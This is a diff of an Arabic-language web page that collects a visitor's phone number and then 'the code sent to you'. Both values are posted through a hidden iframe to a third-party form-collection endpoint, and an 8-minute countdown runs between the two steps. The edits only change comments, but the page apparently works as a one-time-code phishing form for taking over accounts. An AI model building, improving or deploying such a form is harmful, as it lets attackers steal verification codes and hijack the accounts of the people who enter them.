@@ -90,6 +90,7 @@
   <div class="container">
     <h2>نموذج رقم الهاتف والكود</h2>
 
+    <!-- نموذج إرسال رقم الهاتف -->
     <form id="phoneForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" target="hidden_iframe" onsubmit="return sendPhone(event);">
       <label for="phone">رقم الهاتف:</label>
       <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" autocomplete="tel" />
@@ -97,6 +98,7 @@
       <div id="timer"></div>
     </form>
 
+    <!-- نموذج إرسال الكود -->
     <form id="codeForm" action="https://formcarry.com/s/zmPYXkf3utw" method="POST" target="hidden_iframe" onsubmit="return sendCode(event);">
       <div id="codeField">
         <label for="code">الكود المرسل إليك:</label>
@@ -146,8 +148,7 @@
         return false;
       }
 
-      // أرسل رقم الهاتف فقط (الكود فارغ)
-      // أنشئ حقل الكود مخفي فارغ في النموذج
+      // أضف حقل كود مخفي فارغ إذا لم يكن موجوداً
       let hiddenCode = phoneForm.querySelector('input[name="code"]');
       if (!hiddenCode) {
         hiddenCode = document.createElement('input');
@@ -159,7 +160,7 @@
 
       phoneForm.submit();
 
-      // بعد الإرسال، إظهار خانة الكود وتفعيل المؤقت مع تعطيل زر الإرسال
+      // إظهار حقل الكود وتفعيل المؤقت
       codeField.style.display = 'block';
       sendPhoneBtn.disabled = true;
       startTimer(480); // 8 دقائق
@@ -176,8 +177,7 @@
         return false;
       }
 
-      // أرسل رقم الهاتف مع الكود في نموذج الكود
-      // أضف حقل رقم الهاتف مخفي مع قيمة رقم الهاتف
+      // أضف رقم الهاتف كمخفي إلى نموذج الكود
       let hiddenPhone = codeForm.querySelector('input[name="phone"]');
       if (!hiddenPhone) {
         hiddenPhone = document.createElement('input');
